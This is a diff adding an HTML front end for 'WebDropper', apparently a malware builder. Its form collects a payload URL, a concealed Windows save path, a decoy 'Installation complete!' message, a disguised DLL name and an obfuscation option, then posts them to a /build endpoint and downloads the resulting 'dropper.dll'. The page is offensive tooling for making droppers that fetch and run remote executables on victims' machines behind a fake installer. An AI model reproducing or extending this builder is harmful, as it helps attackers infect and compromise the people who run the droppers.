@@ -1,1 +1,82 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebDropper</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: #0b0b0b; color: #f0f0f0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: #1a1a1a; padding: 40px; border-radius: 20px; width: 600px; box-shadow: 0 0 30px rgba(0, 150, 255, 0.1); border: 1px solid #2a2a2a; }
+        h1 { text-align: center; margin-bottom: 30px; color: #00bfff; font-weight: 300; letter-spacing: 2px; }
+        label { display: block; margin-top: 20px; font-size: 14px; color: #aaa; }
+        input, select { width: 100%; padding: 12px; background: #0d0d0d; border: 1px solid #333; color: #fff; border-radius: 8px; margin-top: 5px; outline: none; transition: 0.3s; }
+        input:focus, select:focus { border-color: #00bfff; }
+        .btn { width: 100%; padding: 14px; background: #00bfff; border: none; border-radius: 10px; color: #0b0b0b; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 25px; transition: 0.3s; }
+        .btn:hover { background: #0099cc; transform: scale(1.02); }
+        .status { margin-top: 20px; text-align: center; color: #888; font-size: 14px; }
+        .footer { text-align: center; margin-top: 30px; font-size: 12px; color: #444; }
+        .checkbox-group { display: flex; align-items: center; gap: 10px; margin-top: 15px; }
+        .checkbox-group input { width: auto; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚡ WebDropper</h1>
+        <form id="buildForm">
+            <label>URL (ссылка на файл)</label>
+            <input type="text" name="url" placeholder="https://example.com/payload.exe" required>
 
+            <label>Save Path</label>
+            <select name="save_path">
+                <option value="%TEMP%">TEMP</option>
+                <option value="%APPDATA%\Microsoft\Windows\Caches">Windows Caches</option>
+                <option value="%PROGRAMDATA%">ProgramData</option>
+                <option value="%PUBLIC%">Public</option>
+                <option value="C:\Program Files">Program Files</option>
+            </select>
+
+            <label>Message Box</label>
+            <input type="text" name="message" value="Installation complete!">
+
+            <label>File Name</label>
+            <input type="text" name="custom_filename" placeholder="libhelper.dll">
+
+            <div class="checkbox-group">
+                <input type="checkbox" name="obfuscate" checked>
+                <label style="margin:0;">Obfuscate</label>
+            </div>
+
+            <button type="submit" class="btn">Build</button>
+        </form>
+        <div class="status" id="status">Ready</div>
+        <div class="footer">WebDropper by defensow</div>
+    </div>
+
+    <script>
+        document.getElementById('buildForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const form = e.target;
+            const status = document.getElementById('status');
+            status.textContent = 'Building...';
+            status.style.color = '#ffaa00';
+
+            try {
+                const data = new FormData(form);
+                const res = await fetch('/build', { method: 'POST', body: data });
+                if (!res.ok) throw new Error('Build failed');
+                const blob = await res.blob();
+                const link = document.createElement('a');
+                link.href = URL.createObjectURL(blob);
+                link.download = 'dropper.dll';
+                link.click();
+                status.textContent = 'Download Started!';
+                status.style.color = '#00ff88';
+            } catch (err) {
+                status.textContent = 'Error: ' + err.message;
+                status.style.color = '#ff4444';
+            }
+        });
+    </script>
+</body>
+</html>
